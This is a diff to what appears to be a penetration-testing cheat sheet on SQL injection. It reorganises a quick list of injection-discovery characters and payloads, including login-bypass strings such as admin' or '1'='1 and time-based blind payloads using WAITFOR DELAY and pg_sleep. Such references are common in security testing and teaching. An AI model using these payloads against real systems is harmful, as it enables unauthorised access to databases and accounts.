@@ -61,13 +61,15 @@ mysql> SELECT * FROM logins WHERE username != 'john' AND id > 1;
 ### QUICK
 
 ```sql
--- Use ' " # ; ) --
-';#---              
+-- Discover SQLi with these 5 (URL encode also): ---
+'
+"
+# 
+;
+)
+
+-- Payloads -- 
 admin' or '1'='1
-admin" or '1'='1
-admin# or '1'='1
-admin; or '1'='1
-admin) or '1'='1
 ' or '1'='1
 " or "1"="1
 " or "1"="1"--
@@ -97,7 +99,6 @@ administrator'
 '; IF (1=1) WAITFOR DELAY '0:0:10'
 '||pg_sleep(10)--
 '%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--
-
 ```
 
 ### AUTH BYPASS
